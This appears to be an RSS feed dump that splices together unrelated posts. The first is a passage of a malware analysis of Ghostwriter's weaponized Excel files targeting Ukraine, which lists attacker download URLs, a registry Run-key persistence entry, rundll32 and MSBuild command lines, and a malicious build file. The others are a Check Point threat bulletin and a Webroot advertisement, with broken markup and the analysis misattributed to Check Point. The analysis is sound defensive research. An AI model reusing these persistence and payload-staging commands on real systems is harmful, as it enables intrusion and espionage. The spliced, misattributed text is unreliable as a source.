&lt;p&gt;The fetched file (&lt;code&gt;8d2bb96e69df059f279d97989690ce3e556a8318&lt;/code&gt;) is a benign JPEG file, originating from publicly available photo stock, with no extra payload or any hidden cave where code could be embedded. We confirmed that an identical file can be found online, located on a web site that is nearly identical to the one used by attackers. It would seem the attackers not only reused the JPG file contents from a legitimate website but also copied its original URL, changing only the top level domain:&lt;/p&gt;
&lt;pre&gt;
https://www.everythingandthedog&lt;b&gt;.com&lt;/b&gt;/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.
&lt;/pre&gt;
&lt;p&gt;Once the file is downloaded, it is renamed and then saved to &lt;code&gt;%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Later, it is registered to load during autostart by leveraging the Registry Run key:&lt;/p&gt;
&lt;pre&gt;
HKCU\System\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Certificate Center
&lt;/pre&gt;
&lt;p&gt;with its value pointing to expanded environment variable string:&lt;/p&gt;
&lt;pre&gt;
rundll32.exe C:\Users\\AppData\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll,#1
&lt;/pre&gt;
&lt;p&gt;This Registry entry makes &lt;code&gt;rundll32.exe&lt;/code&gt; load the DLL and execute its exported function with ordinal 1 whenever a user logs on.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114847" style="width: 1999px;"&gt;&lt;img alt="Overview of the malware stages for Weaponized XLS 1" class="size-full wp-image-114847" height="1180" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114847"&gt;Overview of the malware stages for Weaponized XLS 1&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;During our analysis we only observed the benign JPG file being downloaded. However, based on the code analysis, we believe that the real targets receive an actual DLL. We assume that such a targeted payload delivery process is carefully controlled by the attackers and that they deliver the payload only after confirming the requesting client&amp;#8217;s profile (browser user agent, IP address of the client, and matching time of the operation window). &lt;a href="https://www.fortinet.com/blog/threat-research/menace-unleashed-excel-file-deploys-cobalt-strike-at-ukraine" rel="noopener noreferrer" target="_blank"&gt;Research&lt;/a&gt; in a previous campaign found that a Cobalt Strike payload was delivered to targets only if the host IP was located in Ukraine.&lt;/p&gt;
&lt;p&gt;Given the timing and targeting of the attack, we hypothesized that it may not have been an isolated incident. Further research led us to discover other samples closely resembling Weaponized XLS 1, suggesting that multiple attacks using the same techniques had been planned or executed. The samples used in these suspected attacks are described below.&lt;/p&gt;
&lt;h2&gt;Weaponized XLS 2 | Ukraine Gov “Anti-Corruption Initiative”&lt;/h2&gt;
&lt;p&gt;A file bearing the Ukrainian name &lt;code&gt;Zrazok.xls&lt;/code&gt; (“Sample.xls”) is an XLS file (&lt;code&gt;301ffdf0c7b67e01fd2119c321e7ae09b7835afc&lt;/code&gt;) with an obfuscated VBA macro embedded. However, the script code and obfuscation technique are different from the case we discussed earlier.&lt;/p&gt;
&lt;p&gt;For this script, the attackers used a popular obfuscator tool called &lt;a href="https://github.com/sevagas/macro_pack" rel="noopener noreferrer" target="_blank"&gt;Macropack&lt;/a&gt;, an open-source but seemingly abandoned project originally developed for red-teaming and penetration testing exercises.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114845" style="width: 1837px;"&gt;&lt;img alt="Macropack-obfuscated VBA macro found inside the spreadsheet" class="size-full wp-image-114845" height="752" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8.jpg" width="1837" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114845"&gt;Macropack-obfuscated VBA macro found inside the spreadsheet&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;As in the previous case, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to &lt;code&gt;%AppData%\Roaming\Microsoft\bruhdll32.dll&lt;/code&gt;) is loaded with &lt;code&gt;rundll32.exe&lt;/code&gt; and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file and opens it with Excel.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114851" style="width: 1790px;"&gt;&lt;img alt="The decoy document prepared for a Ukrainian reader (an action plan for anti-corruption initiative in government organisations in Ukraine)" class="size-full wp-image-114851" height="1255" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2.jpg" width="1790" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114851"&gt;The decoy document prepared for a Ukrainian reader (an action plan for anti-corruption initiative in government organisations in Ukraine)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;This module attempts to download the next stage from the following URL (unavailable at the time of writing):&lt;/p&gt;
&lt;pre&gt;
https://sciencealert[.]shop/images/2024/11/black-hole-coronaxx.jpg
&lt;/pre&gt;
&lt;p&gt;When the malware issues the HTTP request it uses a hardcoded User-Agent string that differs slightly from the previous case:&lt;/p&gt;
&lt;pre&gt;
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
&lt;/pre&gt;
&lt;p&gt;Notably, this file (&lt;code&gt;52e894acf0e14d27f8997d2174c1f40d6d87bba9&lt;/code&gt;) was previously uploaded to &lt;a href="https://www.virustotal.com/gui/file/4497bb70ca95b115d7be403141e34f7fb06070b8dd6ccf034d9a71c1c48826e4/details" rel="noopener noreferrer" target="_blank"&gt;VirusTotal&lt;/a&gt; on December 19, 2024.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114846" style="width: 1024px;"&gt;&lt;img alt="Image file fetched from the malicious URL" class="size-full wp-image-114846" height="415" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7.jpg" width="1024" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114846"&gt;Image file fetched from the malicious URL&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;As with the previous case, the image file and its URL path appear to be copied from a public blog, published on Nov 16, 2024:&lt;/p&gt;
&lt;pre&gt;
https://www.sciencealert.com/scientists-reveal-the-shape-of-a-black-holes-corona-for-the-very-first-time
&lt;/pre&gt;
&lt;p&gt;Again, the file name and the path on the malicious server were nearly identical to the legitimate one, with the actor changing only the top level domain from &lt;code&gt;.com&lt;/code&gt; to &lt;code&gt;.shop&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;
https://www.sciencealert.com/images/2024/11/black-hole-coronaxx.jpg
&lt;/pre&gt;
&lt;p&gt;In this case, the downloaded file is expected to be an archive in a GZIP format. Once downloaded, the malware decompresses it and saves it to the following location:&lt;/p&gt;
&lt;pre&gt;
%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll
&lt;/pre&gt;
&lt;p&gt;It also creates an additional text config file at:&lt;/p&gt;
&lt;pre&gt;
%APPDATA%\Roaming\Microsoft\SystemCertificates\config
&lt;/pre&gt;
&lt;p&gt;The config file contains the following data:&lt;/p&gt;
&lt;pre&gt;
&amp;lt;Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&amp;gt;
 &amp;lt;PropertyGroup&amp;gt;
  &amp;lt;AssemblyName&amp;gt;Certificate&amp;lt;/AssemblyName&amp;gt;
  &amp;lt;OutputPath&amp;gt;Bin\&amp;lt;/OutputPath&amp;gt;
 &amp;lt;/PropertyGroup&amp;gt;
 &amp;lt;ItemGroup&amp;gt;
  &amp;lt;Compile Include="CertificateCenter.dll" /&amp;gt;
 &amp;lt;/ItemGroup&amp;gt;
 &amp;lt;Target Name="Build"&amp;gt;
  &amp;lt;MakeDir Directories="$(OutputPath)" Condition="!Exists('$(OutputPath)')" /&amp;gt;
  &amp;lt;Csc Sources="@(Compile)" OutputAssembly="$(OutputPath)$(AssemblyName).exe" /&amp;gt;
 &amp;lt;/Target&amp;gt;
&amp;lt;/Project&amp;gt;
&lt;/pre&gt;
&lt;p&gt;The config file is used by the Downloader to execute &lt;code&gt;MSBuild.exe&lt;/code&gt;, instructing it to build a new application:&lt;/p&gt;
&lt;pre&gt;
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe %AppData%\Roaming\Microsoft\SystemCertificates\config
&lt;/pre&gt;
&lt;p&gt;This suggests that the &lt;code&gt;CertificateCenter.dll&lt;/code&gt; file is not a binary as the file extension would suggest but rather contains program source code. The command, if successful, produces an executable file in the following location:&lt;/p&gt;
&lt;pre&gt;
%AppData%\Roaming\Microsoft\SystemCertificates\Bin\Certificate.exe
&lt;/pre&gt;
&lt;p&gt;and likely contains the next stage of the infection chain.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114848" style="width: 1999px;"&gt;&lt;img alt="Overview of the malware stages for Weaponized XLS 2" class="size-full wp-image-114848" height="1621" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114848"&gt;Overview of the malware stages for Weaponized XLS 2&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Weaponized XLS 3 | &amp;#8220;Supplies for Ukraine Armed Forces&amp;#8221;&lt;/h2&gt;
&lt;p&gt;A file bearing the Ukrainian name &lt;code&gt;Донесення 5 реч - зразок.xls&lt;/code&gt; (“Report 5 items &amp;#8211; sample.xls”) is an XLS file (&lt;code&gt;9d110879d101bcaec7accc3001295a53dc33371f&lt;/code&gt;) hosting another VBA payload obfuscated with Macropack.&lt;/p&gt;
&lt;p&gt;As in the previous cases, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to &lt;code&gt;%AppData%\Roaming\Microsoft\bruhdll32.dll&lt;/code&gt;) is loaded with &lt;code&gt;rundll32.exe&lt;/code&gt; and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file on disk and opens it with Excel.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114849" style="width: 1989px;"&gt;&lt;img alt="The decoy document prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)" class="size-full wp-image-114849" height="1256" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4.jpg" width="1989" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114849"&gt;The decoy document prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Again, the malware uses the same payload retrieval technique and downloads a JPG file from yet another &lt;code&gt;.shop&lt;/code&gt; domain:&lt;/p&gt;
&lt;pre&gt;
https://cookingwithbooks[.]shop/images/qwerty.jpg
&lt;/pre&gt;
&lt;p&gt;The URL is unavailable at the time of writing, but data from VirusTotal indicates that the downloaded file is identical to the black hole image described above in the Weaponized XLS 2 section. The malware logic is also identical with Weaponized XLS 2.&lt;/p&gt;
&lt;h2&gt;Weaponized XLS 4 &amp;amp; 5 | Variations on a Theme&lt;/h2&gt;
&lt;p&gt;In addition to the previous findings, we discovered further related XLS files that were similarly weaponized. The files &lt;code&gt;Донесення 5 реч фонд зборів- зразок.xls&lt;/code&gt; (“Report 5 items collection fund- sample.xls”; &lt;code&gt;2c06c01f9261fe80b627695a0ed746aa8f1f3744&lt;/code&gt;) and &lt;code&gt;Додаток 8 реч новий.xls&lt;/code&gt; (“Addition 8 items new &amp;#8211; sample.xls”; &lt;code&gt;853da593d2a489c2bd72a284a362d7c68c3a4d4c&lt;/code&gt;) were first uploaded from Ukraine in Feb 2025.&lt;/p&gt;
&lt;p&gt;Both files contain a Macropack-obfuscated VBA macro; however, they differ in structure. Functionally, both drop a DLL to the previously noted path &lt;code&gt;%AppData%\Roaming\Microsoft\bruhdll32.dll&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Again, the DLL is loaded with &lt;code&gt;rundll32.exe&lt;/code&gt; and respective command line arguments to execute an exported function. Next, the victim sees a decoy workbook open in Excel.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-114853" height="1138" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12.jpg" width="1816" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114855" style="width: 1868px;"&gt;&lt;img alt="The decoy documents prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)" class="size-full wp-image-114855" height="1142" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10.jpg" width="1868" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114855"&gt;The decoy documents prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The decoys are similar and the obfuscation technique, code structure, and the embedded URL are common to both:&lt;/p&gt;
&lt;pre&gt;
https://pigglywigglystores[.]shop/wp-content/themes/fp-wp-j-piggly-wiggly-nc/resources/images/logo/logo.png
&lt;/pre&gt;
&lt;p&gt;The User-Agent string in the HTTP request, however, is different, with the operating system and architectures specified as “Windows NT 10.0; Win64; x64”.&lt;/p&gt;
&lt;pre&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71
&lt;/pre&gt;
&lt;p&gt;These variants of the malware also contain another embedded .NET DLL, internally referred to as LibCMD from the original filename &lt;code&gt;LibCMD.dll&lt;/code&gt; (&lt;code&gt;4ae6b8adc980ba8a212b838f3ca6a9718d9a3757&lt;/code&gt;). This is a small file, whose purpose is simply to start &lt;code&gt;cmd.exe&lt;/code&gt; and connect to stdin/stdout.&lt;/p&gt;
&lt;p&gt;The file contains a tampered PE link timestamp. It is never saved to disk; instead, it is loaded dynamically in memory as a .NET assembly and executed.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114844" style="width: 1999px;"&gt;&lt;img alt="Overview of the malware stages for Weaponized XLS 4 &amp;amp; 5" class="size-full wp-image-114844" height="1621" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114844"&gt;Overview of the malware stages for Weaponized XLS 4 &amp;amp; 5&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Attribution&lt;/h2&gt;
&lt;p&gt;Analysis of techniques used by threat actors can often be helpful in establishing the origin of the attack and the malware it uses. In this case, the obfuscation techniques are quite specific across all the samples we analyzed, allowing us to establish a medium confidence link between them and a malware cluster known as PicassoLoader, a downloader toolkit.&lt;/p&gt;
&lt;p&gt;PicassoLoader has been used in cyber attacks targeting government, military, and civilian entities in Ukraine and Poland and is exclusively associated with the Ghostwriter threat actor (&lt;i&gt;aka&lt;/i&gt; UNC1151, UAC-0057, Blue Dev 4, Moonscape, TA445).&lt;/p&gt;
&lt;p&gt;Throughout 2024, Ghostwriter has repeatedly used a combination of Excel workbooks containing Macropack-obfuscated VBA macros and dropped embedded .NET downloaders obfuscated with ConfuserEx. In our case, the Downloader malware appears to be a simplified implementation of the PicassoLoader.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The Ghostwriter threat actor has been consistently active in the past years and continues its attempts to compromise targets aligned with the interests of Belarus and its closest ally, Russia. It has mounted multiple attacks reported by CERT UA and other security researchers throughout 2024.&lt;/p&gt;
&lt;p&gt;While Belarus doesn’t actively participate in military campaigns in the war in Ukraine, cyber threat actors associated with it appear to have no reservation about conducting cyberespionage operations against Ukrainian targets.&lt;/p&gt;
&lt;p&gt;The campaign described in this publication also serves as confirmation that Ghostwriter is closely tied with the interests of the Belarusian government waging an aggressive pursuit of its opposition and organizations associated with it.&lt;/p&gt;
&lt;div id="threattips"&gt;&lt;/div&gt;
&lt;p&gt;We would like to express our thanks to partners in the region, including &lt;a href="https://resident.ngo/" rel="noopener noreferrer" target="_blank"&gt;RESIDENT.NGO&lt;/a&gt; and others who remain unnamed, for their invaluable collaboration. &lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/24th-february-threat-intelligence-report/"&gt;24th February – Threat Intelligence Report&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;For the latest discoveries in cyber research for the week of 24h February, please download our &lt;a href="https://research.checkpoint.com/wp-content/uploads/2025/02/Threat_Intelligence_News_2025-02-24.pdf"&gt;Threat Intelligence Bulletin&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research &lt;a href="https://research.checkpoint.com/2025/the-bybit-incident-when-research-meets-reality/"&gt;covers&lt;/a&gt; the recent ByBit hack, one of the largest thefts in digital asset history, its implications for crypto security, and security recommendations. In this event, hackers gained access to an offline Ethereum wallet and stole $1.5 billion worth of digital assets. The attack occurred during a routine transfer from an offline cold wallet to a warm wallet, where attackers manipulated the transaction to divert funds to an unknown address. Blockchain analytics firms have attributed the heist to North Korea&amp;#8217;s Lazarus Group.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Threat Emulation and Harmony Endpoint provide protection against this threat &lt;/em&gt;&lt;em&gt;(APT.Wins.Lazarus.*, &lt;/em&gt;&lt;em&gt;APT.Win.Lazarus.*, &lt;/em&gt;&lt;em&gt;APT.Wins.Lazarus.ta.*)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ecuador&amp;#8217;s National Assembly has &lt;a href="https://therecord.media/ecuador-national-assembly-cyberattack"&gt;gone through&lt;/a&gt; two cyberattacks targeted at disrupting its systems and accessing sensitive data. The attack took place a week after the country&amp;#8217;s general election. No details were shared about the impact of the incident or the threat actor behind it.&lt;/li&gt;
&lt;li&gt;Genea, a leading Australian fertility services provider, has &lt;a href="https://www.genea.com.au/pages/important-update-about-a-cyber-incident-MCI2XUN2KJWRFXNMZI2ZZ3QVD2JA"&gt;experienced&lt;/a&gt; a cyber-attack resulting in unauthorized access to its data. The company is currently investigating the nature and extent of the accessed information, including potential exposure of personal data. While some systems were taken offline as a precaution, Genea assures minimal disruption to patient treatments.&lt;/li&gt;
&lt;li&gt;Germany&amp;#8217;s security services &lt;a href="https://therecord.media/german-election-targeted-by-russian-disinformation"&gt;identified&lt;/a&gt; a Russian disinformation campaign aimed at influencing the country&amp;#8217;s federal elections. The campaign, attributed to the group Storm-1516, involves fake videos circulating on social media, falsely depicting ballot manipulation targeting the Alternative for Deutschland (AfD) party. Reports indicate broader efforts to amplify support for the AfD using inauthentic social media accounts.&lt;/li&gt;
&lt;li&gt;New York-based venture capital and private equity firm, Insight Partners, has been a victim of a cyber-attack that &lt;a href="https://www.securityweek.com/vc-company-insight-partners-hacked/"&gt;resulted&lt;/a&gt; in unauthorized access to some of its information systems in January 2025, through a social engineering attack.&lt;/li&gt;
&lt;li&gt;Vorwerk&amp;#8217;s Thermomix recipe forum, Rezeptwelt.de, &lt;a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/data-breach-at-thermomix-recipe-forum-exposes-profile-information-of-3-3-million-users"&gt;suffered&lt;/a&gt; a data breach exposing 3.3 million user records. An external service provider&amp;#8217;s compromised server leaked names, addresses, birth dates, phone numbers, emails, and cooking preferences. Affected users span the Czech Republic, Spain, France, Italy, Poland, Portugal, and Australia.&lt;/li&gt;
&lt;li&gt;CarMoney, a Russian microfinance company, has &lt;a href="https://therecord.media/russia-carmoney-data-breach-ukrainian-cyber-alliance"&gt;confirmed&lt;/a&gt; a cyberattack that forced it to shut down all systems after attackers sent spam messages to customers, falsely claiming the company was closing and writing off all debts. The Ukrainian Cyber Alliance, a group of pro-Ukraine hacktivists, has claimed responsibility.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A high-severity elevation of privilege vulnerability (CVE-2025-24989) in Microsoft Power Pages was actively &lt;a href="https://www.bleepingcomputer.com/news/security/microsoft-fixes-power-pages-zero-day-bug-exploited-in-attacks/"&gt;exploited&lt;/a&gt; as a zero-day before being patched. The flaw allowed attackers to bypass access restrictions on public-facing websites using Power Pages, potentially leading to unauthorized access. Microsoft addressed the vulnerability at the service level and notified affected customers.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://www.horizon3.ai/attack-research/attack-blogs/ivanti-endpoint-manager-multiple-credential-coercion-vulnerabilities/"&gt;share&lt;/a&gt; technical information on four critical vulnerabilities in Ivanti Endpoint Manager (EPM), allowing unauthenticated attackers to coerce the EPM machine account credential for relay attacks, potentially leading to server compromise. The flaws, Credential Coercion Vulnerabilities (CVE-2024-10811 in GetHashForFile, CVE-2024-13161 in GetHashForSingleFile, CVE-2024-13160 in GetHashForWildcard, and CVE-2024-13159 in GetHashForWildcardRecursive), have been patched.&lt;/li&gt;
&lt;/ul&gt;

&lt;li&gt;A newly identified code injection vulnerability (CVE-2025-23209) &lt;a href="https://thehackernews.com/2025/02/cisa-flags-craft-cms-vulnerability-cve.html"&gt;affects&lt;/a&gt; Craft CMS versions 4 and 5, allowing remote code execution when user security keys are compromised. The flaw, now patched, enables attackers to manipulate input fields and inject malicious code into the system. CISA has added the vulnerability to its Known Exploited Vulnerabilities catalog due to observed exploitation.&lt;/li&gt;

&lt;li&gt;Check Point Research &lt;a href="https://blog.checkpoint.com/security/check-point-research-explains-shadow-pad-nailaolocker-and-its-protection/"&gt;elaborates&lt;/a&gt; about threat activity cluster that has been exploiting CVE-2024-24919, a Check Point vulnerability patched in May 2024, to deploy ShadowPad malware. In some cases, NailaoLocker ransomware was also deployed following the initial infection. The campaign, active between June 2024 and January 2025, targeted organizations across Europe, Africa, and the Americas, with the manufacturing sector being the most affected.&lt;/li&gt;

&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/the-cat-and-mouse-game-exploiting-statistical-weaknesses-in-human-interaction-anti-evasions/"&gt;found&lt;/a&gt; a method to evade detection by exploiting statistical anomalies in the human interaction modules of several sandbox solutions. They provide an alternative algorithm for simulated mouse human interaction, including its specifications, parameters, source code, and visual demonstrations. This approach aims to enhance the effectiveness of sandbox emulation against sophisticated evasion techniques.&lt;/li&gt;
&lt;li&gt;Check Point has &lt;a href="https://blog.checkpoint.com/cyber-criminals-using-url-tricks-to-deceive-users/"&gt;identified&lt;/a&gt; that cyber criminals are deploying sophisticated URL manipulation techniques within standard phishing emails, such as fake invoices and account activation notices. Their primary deception method exploits the &amp;#8216;userinfo&amp;#8217; portion of web addresses—the segment between &amp;#8216;http://&amp;#8217; and the &amp;#8216;@&amp;#8217; symbol—to make malicious URLs appear legitimate.&lt;/li&gt;

Cyber threats are no longer just the occasional virus or suspicious email. &lt;a href="https://www.webroot.com/us/en/resources/tips-articles/what-is-phishing"&gt;Phishing &lt;/a&gt;scams, &lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-ransomware"&gt;ransomware &lt;/a&gt;attacks, data breaches, and identity theft are part of a growing list of online dangers that are a daily reality.&lt;/p&gt;



&lt;p&gt;For over 25 years, Webroot has been on the front lines of cybersecurity, protecting millions of people and businesses from evolving threats. What began as antivirus product has expanded into a comprehensive portfolio to secure your entire digital life. With our all-in-one solutions, we’ve created a new standard for digital security—because safeguarding your devices, data, and identity in an increasingly interconnected world is not optional, it’s essential.&lt;/p&gt;



&lt;p&gt;Let’s explore how Webroot has evolved to become your one-stop shop for all things cybersecurity.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Introducing Webroot Total Protection: Comprehensive security for the modern world&lt;/h2&gt;



&lt;p&gt;When you think about cybersecurity, you probably think of antivirus protection—and rightly so. But as technology advances, so do the threats. Today, your &lt;a href="https://www.webroot.com/in/en/resources/glossary/what-is-personally-identifiable-information"&gt;personal information&lt;/a&gt;, online activities, financial data, and even your family’s privacy are targets for attack.&lt;/p&gt;



&lt;p&gt;That’s why Webroot has gone beyond traditional antivirus solutions to create &lt;a href="https://www.webroot.com/us/en/home/products/total-protection"&gt;Webroot Total Protection&lt;/a&gt;, a powerful all-in-one security suite that provides everything you need to stay safe online.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;What is Total Protection?&lt;/h2&gt;



&lt;p&gt;Total Protection is a robust, comprehensive solution that safeguards not just your devices but also your online identity, files, and privacy. It combines multiple security capabilities into one easy-to-use package that includes:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Antivirus protection&lt;/strong&gt;&lt;br /&gt;Detects and neutralizes viruses, &lt;a href="https://www.webroot.com/us/en/resources/tips-articles/what-is-malware-protection"&gt;malware&lt;/a&gt;, &lt;a href="https://www.webroot.com/us/en/resources/tips-articles/what-is-spyware-and-how-to-detect-it"&gt;spyware&lt;/a&gt;, and ransomware.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;&lt;a href="https://www.webroot.com/blog/2017/09/01/password-manager/"&gt;Password Manager&lt;/a&gt;&lt;/strong&gt;&lt;br /&gt;Ensures your passwords are strong and secure, while also making them easy to access and manage.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Identity protection&lt;/strong&gt;&lt;br /&gt;Guards against identity theft by monitoring your personal information and alerting you to potential breaches.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;VPN (Virtual Private Network)&lt;/strong&gt;&lt;br /&gt;Protects your privacy while browsing online, ensuring your data isn’t intercepted or tracked.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Secure backup&lt;/strong&gt;&lt;br /&gt;Keeps your critical files safe from data loss or ransomware attacks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Parental controls&lt;/strong&gt;&lt;br /&gt;Helps you protect your family by limiting access to inappropriate or harmful content online.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;With Total Protection, you can confidently navigate the digital world, knowing your devices, identity, family, and personal data are secure every step of the way.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;What does Webroot Essentials include?&lt;/h2&gt;



&lt;p&gt;Webroot Essentials provides foundational protection against today’s most common cyber threats, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Antivirus and anti-malware&lt;/strong&gt;&lt;br /&gt;Detects and neutralizes viruses, malware, spyware, and ransomware.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Browser protection&lt;/strong&gt;&lt;br /&gt;Keeps you safe while you browse and shop online, surf the web, and connect on social media.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Anti-phishing protection&lt;/strong&gt;&lt;br /&gt;Shields you from phishing attempts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Password Manager&lt;/strong&gt;&lt;br /&gt;Helps you securely store and manage your login credentials.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 class="wp-block-heading"&gt;The benefits of Webroot Total Protection and Essentials&lt;/h2&gt;



&lt;p&gt;The internet has become an integral part of everyday life. From online shopping and banking to remote work and social media, most of us spend a significant portion of our lives connected. While this connectivity brings convenience, it also comes with risks. Cybercrime is increasing at an alarming rate, targeting individuals and families just as often as businesses. Some of the most common threats include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Phishing &lt;/strong&gt;involves fraudulent emails or websites designed to trick you into revealing sensitive information.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Identity theft &lt;/strong&gt;happens when criminals steal your personal information to commit fraud or theft.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Ransomware &lt;/strong&gt;encrypts your files and demands payment to release them.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data breaches &lt;/strong&gt;occur when hackers gain unauthorized access to and steal sensitive files and information.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Viruses and malware&lt;/strong&gt; programs harm your devices or steal your data.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;As these threats become more sophisticated, having robust, multi-layered protection is essential. That’s why Webroot is dedicated to constant innovation, delivering advanced solutions that stay ahead of cybercriminals and adapt to the ever-changing digital landscape to keep you safe.&lt;/p&gt;



&lt;p&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Protection for your growing number of devices&lt;/strong&gt;&lt;br /&gt;With the growing number of devices in every household—laptops, smartphones, tablets, and more—it’s crucial to have security that can keep up. Webroot offers packages designed to cover multiple devices, so you can keep your entire household protected.&lt;/li&gt;

Backed by a dedication to constant innovation, Webroot’s solutions leverage advanced technology to detect and neutralize threats in real time, ensuring you stay protected from cyber-attacks before they can do harm.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Peace of mind for families&lt;/strong&gt;&lt;br /&gt;Features like parental controls and identity protection give families an added layer of security, so parents can rest easy knowing their children are safe online.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Powerful data protection&lt;/strong&gt;&lt;br /&gt;With secure backup included in Total Protection, you don’t have to worry about losing important files to ransomware, malware, or accidental deletion.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Effective antivirus protection&lt;/strong&gt;&lt;br /&gt;In an era where cyber threats are constantly evolving, some people might wonder: Is antivirus protection still necessary? The answer is a resounding yes. Viruses and malware are still very real dangers, and strong protection remains the cornerstone of any good cybersecurity strategy. Webroot’s antivirus technology is constantly updated to protect against the latest threats, and it works seamlessly with our other security tools to provide comprehensive protection.&lt;/li&gt;

